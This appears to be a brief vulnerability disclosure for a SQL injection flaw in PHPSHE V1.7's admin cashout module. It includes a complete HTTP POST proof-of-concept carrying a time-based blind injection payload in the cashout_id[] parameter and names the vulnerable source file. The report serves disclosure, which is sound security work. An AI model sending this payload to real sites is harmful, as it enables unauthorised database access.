# SQL1

PHPSHE V1.7 is vulnerable to SQL injection vulnerabilities. Attackers can inject sql statement via the cashout_id[] parameter to the server.

Poc:
```
POST /phpshe/admin.php?mod=cashout&act=success HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://localhost/phpshe/admin.php?mod=cashout&state=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 55
Cookie: PHPSESSID=0a97c3f86f5b63a3e74ffcdf1c70b59c
Connection: close
Upgrade-Insecure-Requests: 1

cashout_id%5B%5D=1')+and+IF(1=1,sleep(2),1)+and+('1'='1

```
vulnerability verification:
![](https://github.com/lemon666/vuln/blob/master/1.png)
![](https://github.com/lemon666/vuln/blob/master/2.png）
Using sqlmap：
![](https://github.com/lemon666/vuln/blob/master/3.png）
the lines of code where the vulnerability exist：
module/admin/cashout.php
![](https://github.com/lemon666/vuln/blob/master/4.png）
